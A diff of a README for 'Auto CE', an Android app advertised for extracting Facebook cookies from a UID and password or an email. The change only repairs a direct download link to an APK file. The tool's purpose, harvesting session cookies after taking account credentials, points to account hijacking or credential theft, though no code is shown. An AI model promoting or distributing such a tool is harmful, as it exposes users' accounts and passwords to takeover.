@@ -6,7 +6,7 @@
 **Auto CE** is an Android application designed to effortlessly extract Facebook cookies. Whether you're using UID and password or email, **Auto CE** provides a fast and efficient way to get the cookies you need.
 
 ## Download
-[![Download Auto CE](https://img.shields.io/badge/Download-Auto%20CE-brightgreen)]([link_to_your_download](https://raw.githubusercontent.com/Inception09/AutoCE-App/refs/heads/main/Auto%20CE%201.2.apk)
+[![Download Auto CE](https://img.shields.io/badge/Download-Auto%20CE-brightgreen)](https://raw.githubusercontent.com/Inception09/AutoCE-App/refs/heads/main/Auto%20CE%201.2.apk)
 
 ## Features
 - 🔹 **Simple and Intuitive Interface**: Navigate easily with a user-friendly design.
